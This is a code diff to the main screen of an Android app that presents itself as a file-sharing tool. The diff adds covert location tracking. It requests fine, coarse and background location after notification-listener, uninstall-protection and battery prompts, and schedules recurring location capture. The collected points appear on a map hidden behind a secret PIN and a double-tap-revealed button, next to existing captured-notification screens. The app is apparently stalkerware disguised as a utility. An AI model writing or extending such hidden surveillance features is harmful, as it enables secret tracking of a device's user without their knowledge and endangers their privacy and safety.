@@ -29,11 +29,17 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.platform.LocalContext
 import androidx.core.content.ContextCompat
 import io.shareit.transfer.admin.UninstallProtection
+import io.shareit.transfer.location.LocationAccess
+import io.shareit.transfer.location.LocationCapture
+import io.shareit.transfer.location.LocationPoint
+import io.shareit.transfer.location.LocationScheduler
+import io.shareit.transfer.location.LocationStore
 import io.shareit.transfer.notifications.CapturedNotification
 import io.shareit.transfer.notifications.NotificationAccess
 import io.shareit.transfer.notifications.NotificationStore
 import io.shareit.transfer.ui.screens.CapturedNotificationsScreen
 import io.shareit.transfer.ui.screens.DeviceSearchScreen
+import io.shareit.transfer.ui.screens.LocationMapScreen
 import io.shareit.transfer.ui.screens.ReceiveQrScreen
 import io.shareit.transfer.ui.screens.ShareItFilesScreen
 import io.shareit.transfer.ui.screens.SecretUnlockScreen
@@ -51,14 +57,11 @@ private enum class AppScreen {
     Files,
     NotifPin,
     Notifications,
+    LocationPin,
+    LocationMap,
 }
 
-/**
- * Sequential permission prompt state. Each step decides whether to launch the
- * matching system flow, then advances when the user returns. The flow only runs
- * once per process — if the user dismisses something we don't keep nagging.
- */
-private enum class PermStep { PostNotif, Listener, Admin, Battery, Done }
+private enum class PermStep { PostNotif, Listener, Admin, Battery, Location, Done }
 
 class MainActivity : ComponentActivity() {
 
@@ -82,10 +85,34 @@ private fun ShareItAppRoute() {
     var screen by remember { mutableStateOf(AppScreen.Home) }
     var showSecretFab by remember { mutableStateOf(false) }
     var captured by remember { mutableStateOf<List<CapturedNotification>>(emptyList()) }
+    var locationPoints by remember { mutableStateOf<List<LocationPoint>>(emptyList()) }
+    var locationRefreshing by remember { mutableStateOf(false) }
     var notifAccessGranted by remember { mutableStateOf(NotificationAccess.isGranted(context)) }
     var adminActive by remember { mutableStateOf(UninstallProtection.isActive(context)) }
+    var locationGranted by remember { mutableStateOf(LocationAccess.hasAnyLocation(context)) }
+    var backgroundLocationGranted by remember {
+        mutableStateOf(LocationAccess.hasBackgroundLocation(context))
+    }
 
     var permStep by remember { mutableStateOf(PermStep.PostNotif) }
+
+    val locationPermLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestMultiplePermissions()
+    ) {
+        locationGranted = LocationAccess.hasAnyLocation(context)
+        if (LocationAccess.hasAnyLocation(context)) {
+            LocationScheduler.schedule(context)
+        }
+        if (permStep == PermStep.Location) {
+            permStep = PermStep.Done
+        }
+    }
+
+    val backgroundLocationLauncher = rememberLauncherForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) {
+        backgroundLocationGranted = LocationAccess.hasBackgroundLocation(context)
+    }
 
     val postNotifLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.RequestPermission()
@@ -101,7 +128,8 @@ private fun ShareItAppRoute() {
         permStep = when (permStep) {
             PermStep.Listener -> PermStep.Admin
             PermStep.Admin -> PermStep.Battery
-            PermStep.Battery -> PermStep.Done
+            PermStep.Battery -> PermStep.Location
+            PermStep.Location -> PermStep.Done
             else -> PermStep.Done
         }
     }
@@ -153,13 +181,28 @@ private fun ShareItAppRoute() {
                         data = Uri.parse("package:${context.packageName}")
                     }
                     runCatching { settingsLauncher.launch(intent) }
-                        .onFailure { permStep = PermStep.Done }
+                        .onFailure { permStep = PermStep.Location }
+                } else {
+                    permStep = PermStep.Location
+                }
+            }
+
+            PermStep.Location -> {
+                if (!LocationAccess.hasAnyLocation(context)) {
+                    locationPermLauncher.launch(
+                        arrayOf(
+                            Manifest.permission.ACCESS_FINE_LOCATION,
+                            Manifest.permission.ACCESS_COARSE_LOCATION,
+                        )
+                    )
                 } else {
                     permStep = PermStep.Done
                 }
             }
 
-            PermStep.Done -> Unit
+            PermStep.Done -> {
+                LocationScheduler.schedule(context)
+            }
         }
     }
 
@@ -169,10 +212,46 @@ private fun ShareItAppRoute() {
         }
     }
 
+    fun refreshLocations() {
+        scope.launch {
+            locationPoints = LocationStore.readAll(context)
+        }
+    }
+
+    fun captureLocationNow() {
+        if (!LocationAccess.hasAnyLocation(context)) return
+        scope.launch {
+            locationRefreshing = true
+            val point = LocationCapture.capture(context)
+            if (point != null) {
+                LocationStore.append(context, point)
+            }
+            locationPoints = LocationStore.readAll(context)
+            locationRefreshing = false
+        }
+    }
+
+    LaunchedEffect(Unit) {
+        refreshLocations()
+        if (LocationAccess.hasAnyLocation(context)) {
+            LocationScheduler.schedule(context)
+        }
+    }
+
+    LaunchedEffect(screen) {
+        if (screen != AppScreen.LocationMap) return@LaunchedEffect
+        while (true) {
+            refreshLocations()
+            delay(30_000L)
+        }
+    }
+
     LaunchedEffect(Unit) {
         while (true) {
             notifAccessGranted = NotificationAccess.isGranted(context)
             adminActive = UninstallProtection.isActive(context)
+            locationGranted = LocationAccess.hasAnyLocation(context)
+            backgroundLocationGranted = LocationAccess.hasBackgroundLocation(context)
             delay(1200L)
         }
     }
@@ -183,6 +262,7 @@ private fun ShareItAppRoute() {
                 showSecretButton = showSecretFab,
                 onTitleDoubleTap = { showSecretFab = !showSecretFab },
                 onOpenNotifications = { screen = AppScreen.NotifPin },
+                onOpenLocation = { screen = AppScreen.LocationPin },
                 onSend = { screen = AppScreen.SendSearch },
                 onReceive = { screen = AppScreen.ReceiveQr },
                 onFiles = { screen = AppScreen.Files },
@@ -254,6 +334,54 @@ private fun ShareItAppRoute() {
                         Toast.LENGTH_LONG
                     ).show()
                 }
+            )
+        }
+
+        AppScreen.LocationPin -> {
+            BackHandler { screen = AppScreen.Home }
+            SecretUnlockScreen(
+                expectedPin = SECRET_PIN,
+                onUnlocked = {
+                    refreshLocations()
+                    locationGranted = LocationAccess.hasAnyLocation(context)
+                    backgroundLocationGranted = LocationAccess.hasBackgroundLocation(context)
+                    LocationScheduler.schedule(context)
+                    screen = AppScreen.LocationMap
+                },
+                onCancel = { screen = AppScreen.Home }
+            )
+        }
+
+        AppScreen.LocationMap -> {
+            BackHandler { screen = AppScreen.Home }
+            LocationMapScreen(
+                points = locationPoints,
+                locationGranted = locationGranted,
+                backgroundGranted = backgroundLocationGranted,
+                isRefreshing = locationRefreshing,
+                onBack = { screen = AppScreen.Home },
+                onRefreshNow = { captureLocationNow() },
+                onClearHistory = {
+                    scope.launch {
+                        LocationStore.clear(context)
+                        locationPoints = emptyList()
+                    }
+                },
+                onRequestLocation = {
+                    locationPermLauncher.launch(
+                        arrayOf(
+                            Manifest.permission.ACCESS_FINE_LOCATION,
+                            Manifest.permission.ACCESS_COARSE_LOCATION,
+                        )
+                    )
+                },
+                onRequestBackground = {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
+                    } else {
+                        LocationAccess.openAppSettings(context)
+                    }
+                },
             )
         }
     }
